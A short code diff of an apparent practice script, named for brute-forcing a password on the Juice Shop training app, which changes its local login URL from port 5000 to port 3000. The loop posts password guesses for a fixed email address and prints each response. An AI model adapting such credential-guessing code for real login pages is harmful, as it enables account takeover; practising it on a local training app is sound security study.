@@ -7,7 +7,7 @@ def brute_force_attack_password_to_juice_shop():
         headers = {'User-Agent': 'Mozilla/5.0'}
         payload = {'email': 'mk600449@gmail.com', 'password': i}
         session = requests.Session()
-        res = session.post('http://localhost:5000/login',data=payload,headers = headers)
+        res = session.post('http://localhost:3000/login',data=payload,headers = headers)
         print(res.text)
 
 
